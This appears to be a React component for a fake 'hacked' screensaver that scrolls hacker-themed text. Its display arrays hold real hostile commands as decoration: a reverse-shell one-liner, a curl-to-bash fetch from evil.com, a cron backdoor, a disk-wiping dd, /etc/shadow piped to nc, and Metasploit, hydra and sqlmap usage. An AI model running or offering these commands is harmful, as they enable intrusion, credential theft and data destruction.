import { useState, useEffect, useRef, useCallback } from 'react';

const MALICIOUS_SCRIPTS = [
  'root@kali:~# nmap -sS -O 192.168.1.0/24',
  'Starting Nmap 7.94 ( https://nmap.org )',
  'Discovered open port 22/tcp on 192.168.1.105',
  'Discovered open port 443/tcp on 192.168.1.105',
  'Discovered open port 3306/tcp on 192.168.1.105',
  'root@kali:~# msfconsole -q',
  'msf6 > use exploit/multi/handler',
  'msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp',
  'PAYLOAD => windows/meterpreter/reverse_tcp',
  'msf6 exploit(multi/handler) > set LHOST 10.0.0.1',
  'msf6 exploit(multi/handler) > exploit',
  '[*] Started reverse TCP handler on 10.0.0.1:4444',
  '[*] Sending stage (175686 bytes) to 192.168.1.105',
  '[*] Meterpreter session 1 opened',
  'meterpreter > sysinfo',
  'Computer    : TARGET-PC',
  'OS          : Windows 10 (10.0 Build 19041)',
  'Meterpreter : x86/windows',
  'meterpreter > hashdump',
  'Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b',
  'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
  'root@kali:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105',
  '[DATA] attacking ssh://192.168.1.105:22/',
  '[22][ssh] host: 192.168.1.105   login: admin   password: p@ssw0rd123',
  'root@kali:~# sqlmap -u "http://target.com/page?id=1" --dbs --batch',
  '[INFO] testing connection to the target URL',
  '[INFO] the back-end DBMS is MySQL',
  'available databases [4]:',
  '[*] information_schema',
  '[*] mysql',
  '[*] performance_schema',
  '[*] users_db',
  'root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
  'Loaded 3 password hashes with 3 different salts',
  'admin123         (admin)',
  'Session completed.',
];

const CODE_SNIPPETS = [
  `import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);`,
  `while True: exec(compile(raw_input(),"<stdin>","exec"))`,
  `#!/bin/bash\nfor ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from" &`,
  `curl -s http://evil.com/payload.sh | bash`,
  `echo "* * * * * /tmp/.backdoor" >> /var/spool/cron/root`,
  `iptables -A INPUT -p tcp --dport 4444 -j ACCEPT`,
  `dd if=/dev/urandom of=/dev/sda bs=1M count=1024`,
  `chmod 777 /etc/shadow && cat /etc/shadow | nc 10.0.0.1 9999`,
  `find / -name "*.conf" -exec grep -l "password" {} \\;`,
  `tcpdump -i eth0 -w capture.pcap port 80`,
  `airmon-ng start wlan0 && airodump-ng wlan0mon`,
  `nikto -h http://target.com -C all -output scan.txt`,
  `enum4linux -a 192.168.1.105 | tee enum_results.txt`,
  `wpscan --url http://target.com --enumerate u,vp,vt`,
  `hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt --force`,
];

const WARNINGS = [
  '⚠ ACCESS GRANTED ⚠',
  '☠ SYSTEM COMPROMISED ☠',
  '🔓 FIREWALL BYPASSED',
  '⛔ ROOT ACCESS OBTAINED',
  '💀 DATA EXFILTRATION IN PROGRESS',
  '🔴 CRITICAL VULNERABILITY DETECTED',
  '⚡ BRUTE FORCE SUCCESSFUL',
  '🔥 BACKDOOR INSTALLED',
  '🕷 MALWARE DEPLOYED',
  '⚠ ENCRYPTING FILES ⚠',
];

const HEX_CHARS = '0123456789ABCDEF';
const BINARY = '01';

interface StreamLine {
  id: number;
  text: string;
  type: 'script' | 'code' | 'warning' | 'hex' | 'progress' | 'binary';
  x: number;
  delay: number;
}

export const HackedScreensaver = () => {
  const [streams, setStreams] = useState<StreamLine[][]>([[], [], []]);
  const [glitchText, setGlitchText] = useState('');
  const [showSkull, setShowSkull] = useState(false);
  const [progress, setProgress] = useState(0);
  const [hexDump, setHexDump] = useState<string[]>([]);
  const idCounter = useRef(0);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Matrix rain on canvas
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const cols = Math.floor(canvas.width / 14);
    const drops: number[] = Array(cols).fill(1);
    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF{}[]()<>!@#$%^&*';

    const draw = () => {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      for (let i = 0; i < drops.length; i++) {
        const isRed = Math.random() > 0.7;
        ctx.fillStyle = isRed ? '#ff0040' : '#00ff41';
        ctx.font = '14px JetBrains Mono, monospace';
        ctx.shadowBlur = isRed ? 15 : 8;
        ctx.shadowColor = isRed ? '#ff0040' : '#00ff41';
        const char = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(char, i * 14, drops[i] * 14);
        ctx.shadowBlur = 0;

        if (drops[i] * 14 > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    };

    const interval = setInterval(draw, 40);
    const handleResize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', handleResize);
    return () => { clearInterval(interval); window.removeEventListener('resize', handleResize); };
  }, []);

  // Scrolling terminal streams
  useEffect(() => {
    const intervals = [0, 1, 2].map((streamIdx) => {
      return setInterval(() => {
        const rand = Math.random();
        let text: string;
        let type: StreamLine['type'];

        if (rand < 0.35) {
          text = MALICIOUS_SCRIPTS[Math.floor(Math.random() * MALICIOUS_SCRIPTS.length)];
          type = 'script';
        } else if (rand < 0.55) {
          text = CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)];
          type = 'code';
        } else if (rand < 0.65) {
          text = WARNINGS[Math.floor(Math.random() * WARNINGS.length)];
          type = 'warning';
        } else if (rand < 0.8) {
          text = Array.from({ length: 32 }, () => HEX_CHARS[Math.floor(Math.random() * 16)]).join(' ');
          type = 'hex';
        } else if (rand < 0.9) {
          const pct = Math.floor(Math.random() * 100);
          text = `[${'█'.repeat(Math.floor(pct / 5))}${'░'.repeat(20 - Math.floor(pct / 5))}] ${pct}% — Exfiltrating data...`;
          type = 'progress';
        } else {
          text = Array.from({ length: 64 }, () => BINARY[Math.floor(Math.random() * 2)]).join('');
          type = 'binary';
        }

        const newLine: StreamLine = {
          id: idCounter.current++,
          text,
          type,
          x: streamIdx * 33,
          delay: Math.random() * 0.3,
        };

        setStreams(prev => {
          const updated = [...prev];
          updated[streamIdx] = [...updated[streamIdx], newLine].slice(-30);
          return updated;
        });
      }, 150 + streamIdx * 80);
    });

    return () => intervals.forEach(clearInterval);
  }, []);

  // Glitch warning text
  useEffect(() => {
    const interval = setInterval(() => {
      setGlitchText(WARNINGS[Math.floor(Math.random() * WARNINGS.length)]);
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  // Skull flash
  useEffect(() => {
    const interval = setInterval(() => {
      setShowSkull(true);
      setTimeout(() => setShowSkull(false), 300);
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  // Fake progress
  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(p => (p >= 100 ? 0 : p + Math.random() * 3));
    }, 200);
    return () => clearInterval(interval);
  }, []);

  // Hex dump sidebar
  useEffect(() => {
    const interval = setInterval(() => {
      const addr = Math.floor(Math.random() * 0xFFFFFF).toString(16).padStart(6, '0');
      const bytes = Array.from({ length: 16 }, () =>
        Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
      ).join(' ');
      setHexDump(prev => [...prev, `0x${addr}: ${bytes}`].slice(-20));
    }, 100);
    return () => clearInterval(interval);
  }, []);

  const getLineColor = (type: StreamLine['type']) => {
    switch (type) {
      case 'warning': return 'text-red-400 font-bold animate-pulse';
      case 'script': return 'text-green-400';
      case 'code': return 'text-yellow-300/80';
      case 'hex': return 'text-cyan-400/60';
      case 'progress': return 'text-orange-400';
      case 'binary': return 'text-green-500/40';
      default: return 'text-green-400';
    }
  };

  const SKULL = `
    ████████████████████████
    ██                    ██
    ██   ▄███▄    ▄███▄   ██
    ██   █████    █████   ██
    ██   ▀███▀    ▀███▀   ██
    ██                    ██
    ██       ▄██▄        ██
    ██      ▀████▀       ██
    ██   ▄▀▄▀▄▀▄▀▄      ██
    ██                    ██
    ████████████████████████
       SYSTEM COMPROMISED
  `;

  return (
    <div className="fixed inset-0 z-50 bg-black cursor-none overflow-hidden">
      {/* Matrix rain canvas */}
      <canvas ref={canvasRef} className="absolute inset-0 opacity-40" />

      {/* Scanline overlay */}
      <div className="absolute inset-0 pointer-events-none z-30"
        style={{
          background: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px)',
        }}
      />

      {/* CRT flicker */}
      <div className="absolute inset-0 pointer-events-none z-30 animate-pulse opacity-[0.03] bg-white" />

      {/* Terminal streams */}
      <div className="absolute inset-0 z-10 flex">
        {streams.map((stream, idx) => (
          <div key={idx} className="flex-1 overflow-hidden px-2 pt-12 pb-4" style={{ opacity: 0.9 }}>
            <div className="space-y-0.5">
              {stream.map((line) => (
                <div
                  key={line.id}
                  className={`text-[10px] md:text-xs font-mono whitespace-nowrap overflow-hidden ${getLineColor(line.type)}`}
                  style={{
                    textShadow: line.type === 'warning'
                      ? '0 0 10px #ff0040, 0 0 20px #ff0040'
                      : '0 0 5px currentColor',
                    animationDelay: `${line.delay}s`,
                  }}
                >
                  {line.type === 'script' && <span className="text-green-600">$ </span>}
                  {line.text}
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* Hex dump right sidebar */}
      <div className="absolute right-0 top-12 bottom-0 w-64 z-20 overflow-hidden opacity-30 pointer-events-none hidden md:block">
        <div className="space-y-0">
          {hexDump.map((line, i) => (
            <div key={i} className="text-[9px] font-mono text-cyan-500/50 whitespace-nowrap"
              style={{ textShadow: '0 0 3px #00ffff' }}>
              {line}
            </div>
          ))}
        </div>
      </div>

      {/* Glitch warning banner */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-20 pointer-events-none">
        <div className="text-center">
          <div
            className="text-2xl md:text-5xl font-bold font-mono text-red-500 tracking-widest"
            style={{
              textShadow: '0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff002060',
              animation: 'glitch 0.3s infinite',
            }}
          >
            {glitchText}
          </div>
          {/* Progress bar */}
          <div className="mt-6 w-80 md:w-[500px] mx-auto">
            <div className="h-2 bg-gray-900 border border-red-900/50 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-red-600 via-red-500 to-orange-500 transition-all duration-200"
                style={{ width: `${Math.min(progress, 100)}%`, boxShadow: '0 0 10px #ff0040' }}
              />
            </div>
            <div className="text-red-400/80 text-xs font-mono mt-2 tracking-wider">
              ENCRYPTING FILES... {Math.min(Math.floor(progress), 100)}%
            </div>
          </div>
        </div>
      </div>

      {/* Skull flash */}
      {showSkull && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 pointer-events-none">
          <pre
            className="text-red-500 text-xs md:text-sm font-mono text-center leading-tight"
            style={{ textShadow: '0 0 20px #ff0040, 0 0 40px #ff0040' }}
          >
            {SKULL}
          </pre>
        </div>
      )}

      {/* Corner IP addresses */}
      <div className="absolute top-12 left-3 z-20 text-[10px] font-mono text-green-500/60 pointer-events-none"
        style={{ textShadow: '0 0 5px #00ff41' }}>
        ATTACKER: 10.0.0.1:4444<br />
        TARGET: 192.168.1.105<br />
        SESSION: meterpreter/1<br />
        UPTIME: {new Date().toLocaleTimeString()}
      </div>

      <div className="absolute bottom-3 left-3 z-20 text-[10px] font-mono text-red-500/60 pointer-events-none"
        style={{ textShadow: '0 0 5px #ff0040' }}>
        ⚠ UNAUTHORIZED ACCESS DETECTED<br />
        TRACE ROUTE: OBFUSCATED<br />
        PROXY CHAIN: 7 NODES ACTIVE
      </div>

      {/* Exit hint */}
      <div className="absolute bottom-3 right-3 z-20 text-[10px] font-mono text-green-500/30 pointer-events-none">
        press any key to regain control...
      </div>

      {/* Glitch keyframes */}
      <style>{`
        @keyframes glitch {
          0% { transform: translate(0); }
          20% { transform: translate(-2px, 2px); }
          40% { transform: translate(2px, -2px); }
          60% { transform: translate(-1px, -1px); }
          80% { transform: translate(1px, 1px); }
          100% { transform: translate(0); }
        }
      `}</style>
    </div>
  );
};
